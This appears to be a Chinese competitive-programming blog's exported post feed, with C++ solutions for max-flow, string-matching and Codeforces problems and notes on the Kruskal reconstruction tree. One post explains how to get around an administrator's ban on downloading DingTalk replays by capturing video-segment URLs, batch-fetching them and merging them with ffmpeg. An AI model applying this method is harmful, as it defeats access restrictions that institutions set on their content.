class="built_in">insert</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">build_fail</span>();</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, t);</span><br><span class="line">    <span class="built_in">query</span>();<span class="built_in">topo</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= n;i++) &#123;</span><br><span class="line">        cout&lt;&lt;ans[num[i]]&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 字符串 </category>
          
          <category> AC自动机 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>最小费用最大流应用</title>
      <link href="/2022/04/02/%E6%9C%80%E5%B0%8F%E8%B4%B9%E7%94%A8%E6%9C%80%E5%A4%A7%E6%B5%81%E5%BA%94%E7%94%A8/"/>
      <url>/2022/04/02/%E6%9C%80%E5%B0%8F%E8%B4%B9%E7%94%A8%E6%9C%80%E5%A4%A7%E6%B5%81%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>一道小思维题</p><span id="more"></span><p>题目描述</p><p><img src="/2022/04/02/%E6%9C%80%E5%B0%8F%E8%B4%B9%E7%94%A8%E6%9C%80%E5%A4%A7%E6%B5%81%E5%BA%94%E7%94%A8/1.png" alt="1"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 6000</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">    </span><br><span class="line">&#125;e[maxn*<span class="number">3000</span>];</span><br><span class="line"><span class="keyword">int</span> root[maxn],cnt=<span class="number">1</span>,dep[maxn];</span><br><span class="line"><span class="keyword">int</span> n,m,q,x,y;</span><br><span class="line">queue&lt;<span class="keyword">int</span>&gt;que;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> x = <span class="number">0</span>, w = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">char</span> ch = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (ch &lt; <span class="string">&#x27;0&#x27;</span> || ch &gt; <span class="string">&#x27;9&#x27;</span>) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (ch == <span class="string">&#x27;-&#x27;</span>) w = <span class="number">-1</span>;        </span><br><span class="line">    ch = <span class="built_in">getchar</span>();               </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (ch &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;  </span><br><span class="line">    x = x * <span class="number">10</span> + (ch - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    ch = <span class="built_in">getchar</span>();  </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> x * w; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w)</span></span>&#123;</span><br><span class="line">    e[++cnt]=&#123;y,w,root[x]&#125;;</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">bfs</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(que.<span class="built_in">size</span>())que.<span class="built_in">pop</span>();</span><br><span class="line">    <span class="built_in">memset</span>(dep,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(dep));</span><br><span class="line">    dep[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">    que.<span class="built_in">push</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">while</span>(que.<span class="built_in">size</span>())&#123;</span><br><span class="line">        <span class="keyword">int</span> u=que.<span class="built_in">front</span>();</span><br><span class="line">        que.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=e[i].next)&#123;</span><br><span class="line">            <span class="keyword">int</span> w=e[i].w,v=e[i].to;</span><br><span class="line">            <span class="keyword">if</span>(!w||dep[v])<span class="keyword">continue</span>;</span><br><span class="line">            dep[v]=dep[u]+<span class="number">1</span>;</span><br><span class="line">            que.<span class="built_in">push</span>(v);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dep[<span class="number">2</span>*n+<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Dinic</span><span class="params">(<span class="keyword">int</span> u,<span class="keyword">int</span> in)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(u==<span class="number">2</span>*n+<span class="number">1</span>)<span class="keyword">return</span> in;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=e[i].next)&#123;</span><br><span class="line">        <span class="keyword">int</span> v=e[i].to,w=e[i].w;</span><br><span class="line">        <span class="keyword">if</span>(dep[v]&gt;dep[u]&amp;&amp;w)&#123;</span><br><span class="line">            <span class="keyword">int</span> res=<span class="built_in">Dinic</span>(v,<span class="built_in">min</span>(in,w));</span><br><span class="line">            e[i].w-=res;</span><br><span class="line">            e[i^<span class="number">1</span>].w+=res;</span><br><span class="line">            in-=res;</span><br><span class="line">            ans+=res;</span><br><span class="line">            <span class="keyword">if</span>(!in)<span class="keyword">return</span> ans;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(ans==<span class="number">0</span>)dep[u]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> ans;    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    n=<span class="built_in">rd</span>();</span><br><span class="line">    m=<span class="built_in">rd</span>();</span><br><span class="line">    q=<span class="built_in">rd</span>();</span><br><span class="line">    <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">        x=<span class="built_in">rd</span>();</span><br><span class="line">        <span class="built_in">add</span>(<span class="number">0</span>,x,<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">add</span>(x,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">add</span>(i,i+n,<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">add</span>(i+n,i,<span class="number">0</span>);</span><br><span class="line">        x=<span class="built_in">rd</span>();</span><br><span class="line">        <span class="keyword">while</span>(x--)&#123;</span><br><span class="line">            y=<span class="built_in">rd</span>();</span><br><span class="line">            <span class="built_in">add</span>(i+n,y,<span class="number">1</span>);</span><br><span class="line">            <span class="built_in">add</span>(y,i+n,<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        x=<span class="built_in">rd</span>();</span><br><span class="line">        <span class="built_in">add</span>(x+n,<span class="number">2</span>*n+<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">add</span>(<span class="number">2</span>*n+<span class="number">1</span>,x+n,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">bfs</span>())&#123;</span><br><span class="line">        ans+=<span class="built_in">Dinic</span>(<span class="number">0</span>,<span class="number">0x7fffffff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 图论 </category>
          
          <category> 最小费用最大流 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>关于钉钉保存回放的方式</title>
      <link href="/2022/03/20/Dingtalk/"/>
      <url>/2022/03/20/Dingtalk/</url>
      
        <content type="html"><![CDATA[<p>最近需要下载钉钉的录屏回放，但是管理员禁止了下载，找到了众多的方法都不得行，后面自己开辟了一个方法（我也不敢确定是不是没有人用这个方法，反正这个方法不是通过搜索得到的。。</p><span id="more"></span><p>先说说我通过搜索资源得到了些什么方法吧，其实大多数就指向一种方法——通过fd抓包找到m3u8的下载地址，然而我在用fd抓包的时候并没有找到m3u8的下载地址，也有说用旧版本的钉钉的，但是我发现根本扫不上去，于是我仔细观察fd得到的包，发现播放视频的时候大部分出现了 .TS文件格式的url请求。</p><p><img src="/2022/03/20/Dingtalk/1.png" alt="1"></p><p>可以看到每过一会就会请求一个对应的 <code>ts</code> 文件，我也去搜了一下 <code>ts</code> 文件的含义，差不多就是视频的切片。因此如果我能得到所有的ts的下载地址，那么我就相当于得到了这个视频。</p><p>但是在请求这个 <code>ts</code> 文件的时候必须加上一个 <code>auth_key</code> 参数，然后这个参数貌似也是个随机的散列值，目前信息有限没办法计算出这个散列值的排布规律，但是我能得到一个最朴素的做法：暴力得到所有的 <code>ts</code> 的url，然后一个一个下载，最后用 <code>ffmpeg</code> 去合并就好了。</p><p>然而这里我们并不需要看完所有的视频，我们可以快进，我理解的原理是这样的：假如把你的视频切成 20S一片，在你需要的时候请求，然而假如我不看完，直接跳过这个请求，那么它马上就会请求下一个视频的地址，然后此时被我们捕获到了，之后循环往复我们就能快速地得到所有的请求url，这里的话仅复制url可以快速把url全部复制过来。</p><p>这里我选择按键模拟器去点击这个右键播放，然后间隔频率设置成0.2S，每看1S跳过50S，相当于快进50倍，一个50min的视频我们在1min就能整完，这个效率还是不错的，如果发现ts有丢失那么你可以定位到那个地方重新观察一下请求，然后url复制过来。</p><p><img src="/2022/03/20/Dingtalk/2.png" alt="2"></p><p>我本来想这么多url用爬虫读取url一个个爬然后保存的，结果不知道为啥报错了，于是我选择最蠢的办法：cmd命令。</p><p>在所有url前加上start，然后后缀改一下bat，为了防止电脑卡顿，在每一个start前加上一个暂停的命令，然后我们得到了一个这样的文件：</p><p><img src="/2022/03/20/Dingtalk/3.png" alt="3"></p><p>最后就是枯燥的请求了，这个等着吧，如果你觉得电脑hold的住那么你可以不加暂停的，它会周期弹网页出来，情况就是这样子的：</p><p><img src="/2022/03/20/Dingtalk/4.png" alt="4"></p><p>我还发现一个问题，就是它有时候这个回放并不是严格的就是正整数递增的，中间我有遇到过那种 <code>10000001.ts</code> 的文件，就是突然这样的，也不知道为啥，所以最后写合并指令的时候也比较难，但是难处千千万，靠自己还是能解决的。选择直接在里面放一个python脚本自动合并，合并的命令是这样的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i &quot;concat:文件1|文件2|文件3|……|文件n&quot; -c copy output.mp4</span><br></pre></td></tr></table></figure><p>里面主要的就是要扫一下目录获取所有的文件名并让他们按一定顺序排列，这个我也直接放一下吧，也挺简单的，没什么需要解释的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">f=os.listdir(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">num=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">    <span class="keyword">if</span> i[-<span class="number">2</span>:]!=<span class="string">&#x27;ts&#x27;</span>:<span class="keyword">continue</span></span><br><span class="line">    num.append(<span class="built_in">int</span>(i[:-<span class="number">3</span>]))</span><br><span class="line">num.sort()</span><br><span class="line">fi=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> q <span class="keyword">in</span> num:</span><br><span class="line">    fi+=<span class="built_in">str</span>(q)+<span class="string">&#x27;.ts|&#x27;</span></span><br><span class="line">cmd=<span class="string">&#x27;ffmpeg -i &quot;concat:&#x27;</span>+fi[:-<span class="number">1</span>]+<span class="string">&#x27;&quot; -c copy output.mp4&#x27;</span></span><br><span class="line">os.system(cmd)</span><br></pre></td></tr></table></figure><p>如果不放心可以先print一下看看得到的cmd是什么样的，下面给出我的目录图和运行图：</p><p><img src="/2022/03/20/Dingtalk/5.png" alt="5"></p><p>最后就是运行一遍那个命令了，看看有没有得到你们心心念念的视频吧。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CF1626C</title>
      <link href="/2022/03/19/CF1626C/"/>
      <url>/2022/03/19/CF1626C/</url>
      
        <content type="html"><![CDATA[<p>一道思维好题，写篇题解纪念一下。</p><span id="more"></span><h3 id="Problem-Description"><a href="#Problem-Description" class="headerlink" title="Problem Description"></a>Problem Description</h3><p>有 $n$ 个敌人，你需要在第 $k_i$ 秒用至少 $h_i$ 的攻击力打败这个敌人。</p><p>攻击力的计算方式如下：</p><ol><li> 第一秒时，你有 $1$ 攻击力</li><li> 对于后面的任意一秒，若前一秒你的攻击力为 $x$，则这一秒你的攻击力可以为 $x+1$ 或 $1$</li></ol><p>一秒内，如果你的攻击力为 $x$，则你就需要消耗 $x$ 的能量。</p><p>请问，在你打败所有敌人的情况下，最少需要消耗多少能量。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>在一秒内，你可以继承之前的攻击力，但是继承攻击力的代价就是你要花费相当于继承之后攻击力的法力值来保存你的攻击力。只有当前攻击力大于当前出现的怪物的血量的时候，你才能杀死他。在任意一秒，你可以选择摆烂，但是摆烂的代价就是会丢失上一秒的攻击力，使你在下一秒的时候无法有之前那么高的攻击，摆烂可以选择从 $0$ 开始或者从 $1$ 开始。显然可以发现，当 $k_i\ge h_i$ 的时候，主角总是有办法杀死所有的怪物的。 </p><p>在杀死所有的怪物的怪物下要保证消耗的法力值最少，那就需要我们合理分配增加攻击的时间了。我们不难得出以下结论：</p><p>如果在第 $k_i$ 秒遇到了血量为 $h_i$ 的怪物，那么在 $(k_i-h_i,k_i]$ 的时间区间内，我不能出现摆烂的情况，即攻击力不能掉，在 $k_i-h_i$ 的时刻，攻击力不能减为 $0$。</p><p>那么第 $i$ 个怪物需要我花费的最少法力值就是从 $1$ 到 $h_i$ 的等差数列，假设我打完怪物之后我都能立刻摆烂，那么不难得出总法力消耗就是 $\sum _{i=1}^{n} \sum _{j=1}^{h_i} j$ 。但是并不是每一次打完怪物我都能摆烂，如果我摆烂到 $0$，剩下的时间不足以我积攒足够的攻击去击杀接下来的怪物那就不能摆烂而是接着蓄力。</p><p>对于每一个怪物我们都构造一个区间，区间范围为 $[k_i-h_i+1,k_i]$ ，当区间出现相交，则合并两个区间，最后根据区间长度计算法力值即可。</p><p>对于每一个区间我观察我的左端点是否会落在上一个区间内，如果在，则需要合并前面的区间，因为我们默认按照 $k_i$ 排序了，也就是按照区间右端点值排序，所以我可以用 $\text{lower_bound}$ 来寻找合并的区间。因为如果最后一个怪物它要求我从第一秒开始蓄力的话，那么前面的所有区间我都要合并，所以这里必须考虑合并的区间。对于合并的区间我们修改 $l$ 为其中最小值，$r$ 为其中最大值。然后在计算区间的时候特判一下连续的区间是否相等，达到只计算一次的目的即可。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 105</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> h[maxn],k[maxn],l[maxn],r[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="built_in">memset</span>(l,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(l));</span><br><span class="line">    <span class="built_in">memset</span>(r,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(l));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)cin&gt;&gt;k[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)cin&gt;&gt;h[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        l[i]=k[i]-h[i]+<span class="number">1</span>;</span><br><span class="line">        r[i]=k[i];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(l[i]&lt;=r[i<span class="number">-1</span>])&#123;</span><br><span class="line">            <span class="keyword">int</span> j=i;</span><br><span class="line">            <span class="keyword">int</span> p=<span class="built_in">lower_bound</span>(r+<span class="number">1</span>,r+<span class="number">1</span>+i,l[i])-r;</span><br><span class="line">            <span class="comment">//if(p==0)p++;</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=p;j&lt;=i;j++)&#123;</span><br><span class="line">                l[j]=<span class="built_in">min</span>(l[p],l[i]);</span><br><span class="line">                r[j]=r[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(l[i]==l[i<span class="number">-1</span>]&amp;&amp;r[i]==r[i<span class="number">-1</span>])<span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">int</span> num=r[i]-l[i]+<span class="number">1</span>;</span><br><span class="line">        ans+=<span class="number">1ll</span>*(num+<span class="number">1</span>)*num/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(l[i]-r[i<span class="number">-1</span>]&gt;<span class="number">1</span>&amp;&amp;l[i<span class="number">-1</span>]!=<span class="number">0</span>)&#123;</span><br><span class="line">            ;<span class="comment">//ans+=l[i]-r[i-1]-1;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;1.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 思维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Kruskal 重构树的学习笔记</title>
      <link href="/2022/03/08/Kruskal%E9%87%8D%E6%9E%84%E6%A0%91/"/>
      <url>/2022/03/08/Kruskal%E9%87%8D%E6%9E%84%E6%A0%91/</url>
      
        <content type="html"><![CDATA[<p>比赛遇到了新鲜的图论题，特此记录。</p><span id="more"></span><h2 id="什么是Kruskal重构树？"><a href="#什么是Kruskal重构树？" class="headerlink" title="什么是Kruskal重构树？"></a>什么是Kruskal重构树？</h2><p> $\text{Kruskal}$ 重构树，和 $\text{Kruskal}$ 算法的思想差不多，就是在这个过程中建出一个有着非常优秀的性质的数据结构，这是一个非常少见和小众的算法，但是如果碰到了合适的题目，就会体现出其优越性。</p><h2 id="如何实现？"><a href="#如何实现？" class="headerlink" title="如何实现？"></a>如何实现？</h2><p>既然它叫 $\text{Kruskal}$ 重构树，那么它必然与 $\text{Kruskal}$ 有着密不可分的联系。首先我们回顾一下 $\text{Kruskal}$ 最小生成树是怎么实现的，先将所有边按照权值排序，然后再从小到大添加边，如果添加边的两个顶点都在生成树当中则跳过这条边，直到添加过n-1次算法结束。</p><p>我们在添加边的时候构造一棵这样的树：当边e被添加时，e的两顶点一定在不同的生成树内，因此将两个顶点所在的树用一个点连接起来，点的权值为这条边的权值，这个点的权值表示了什么呢？就是这两个子树上，其中一个子树所有的顶点到另一个子树的所有顶点中经过的边的最大值的最小值为这条边的边权。</p><p>首先先解释一下什么叫<strong>最大值的最小值</strong>，这句话可能有点抽象，那我具体举一个例子。我一个节点从 $u\to v$ 有可能经过多条边，这里面的最大值是我要计算的，而可能不止这一种走法，我现在希望这个最大值最小，这就是所谓的最大值的最小值啦。最大值指的是一条路径的最大值，最小值指的是所有路径中的这个值最小。</p><p>其次，很容易证明我们得到的树是一颗二叉树，因为对于n个点，每次我都是添加根节点连接两个子树或者节点，也很容易证明叶节点都为原图中的节点，因为我们只为这些节点不停地添加父亲而没有给他们儿子，自然就是叶子节点啦。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>exp(指example</p><p>举个例子，下面这个图。</p><p><img src="/2022/03/08/Kruskal%E9%87%8D%E6%9E%84%E6%A0%91/1.png" alt="1"></p><p>第一步，我们先选择1和2，发现不在同一集合，选择添加，我们新建一个节点来作为它们的父亲，它的点的权值为1，这里我换个颜色避免引起歧义，这里的1表示值而不是编号。</p><p><img src="/2022/03/08/Kruskal%E9%87%8D%E6%9E%84%E6%A0%91/2.png" alt="2"></p><p>重复第一步，找到2，然后。</p><p><img src="/2022/03/08/Kruskal%E9%87%8D%E6%9E%84%E6%A0%91/3.png" alt="3"></p><p>然后找到权值为3的点，发现1，3同属于一个树，跳过。再找到4，添加，得到下面这张图。</p><p><img src="/2022/03/08/Kruskal%E9%87%8D%E6%9E%84%E6%A0%91/4.png" alt="4"></p><p>我们来看看符不符合我们上面总结的那个结论。</p><p>1和2我们走过的最短路径显然就是1；1到3我们需要走过路径最大值的最小值是2，虽然我能一步到达，但是先走2，再走3我们的路径长度为 $\to 1\to 2 \to$ 显然这样走过的最长的路的最小值就是2了，可以发现1和3由根节点权值为2的点连接，也没问题，同理其它任何四个点两两之间都符合这个规律。</p><p>在实现上面我们可以通过LCA来快速查询两个点之间的最大路径的最小值，因为也可以发现两个点之间的LCA的权值就是我想要的答案，这一部分可以倍增预处理然后打到一次 $log_2n$ 的复杂度。</p><h2 id="有什么用？"><a href="#有什么用？" class="headerlink" title="有什么用？"></a>有什么用？</h2><p>这应该是我们最应该关心的问题了，学了一个数据结构应该想办法加以利用。来看一道经典例题：</p><hr><p>给出n个点，m条边构成的无向图，要求指定两点，算出它们之间的最短路径值。</p><p>这题很容易知道可以使用单源最短路算法，但是我们也会想到动态规划。因为我到了一个点之后，我不需要关心这个点是怎么到的，这个叫无后效性，即前面的决策不影响后面的答案。</p><p>那我们对此题稍微改一下：要求求出所有我经过路径最大值的最小值是多少？</p><p>这题显然，也是无后效性我们只需要一步步往前推然后保存最大值即可。但是问题来了，如果我再加上多个询问呢？那么此时算法的时间复杂度将加上n倍，一次处理相当于进行一次的 $\text{dijkstra}$，$O(nlog_2n)$的复杂度，妥妥的超时。如果我们选择 $\text{Kruskal}$ 重构树预处理，再加上加上LCA，把一次询问的复杂度降低到 $O(log_2n)$ ，那么最终得到的算法复杂度就会低很多了。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>直接拿上ICPC2021上海站的I题——<a href="https://ac.nowcoder.com/acm/contest/29789/H">Life is a game</a></p><hr><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>Life is a game.</p><p> The world can be regarded as an undirected connected graph of $n$ cities and mmm undirected roads between the cities. Now you, the life game player, are going to play the life game on the world graph.</p><p> Initially, you are at the $x$-th city and of $k$ social ability points. You can earn social ability points by living and working. Specifically, you can earn $a_i$ social ability points by living and working in the $i$-th city. But in this problem, you cannot earn social ability points duplicatedly in one city, so you want to travel the world and earn more social ability points. However, the roads are not easy. Specifically, there is an ability threshold $i$_iwi​ for the $i$-th road, you should be of at least $w_i$ social ability points to go through the road. Moreover, Your social ability point will not decrease when passing roads but just need to be at least $w_i$​ if you want to go through the $i$-th road.</p><p> So as you can see, the life game is just living, working and traveling repeatedly. There are $q$ game saves. For each game save, the initial city and social ability point is given and the player has not lived or worked in any city. Now you, the real life game player, need to determine the maximum possible number of social ability points you can have in the end of the game and output it for each given game save.</p><p>这里来解释一下这个题意。</p><p>就是说有一个 $n$ 点 $m$ 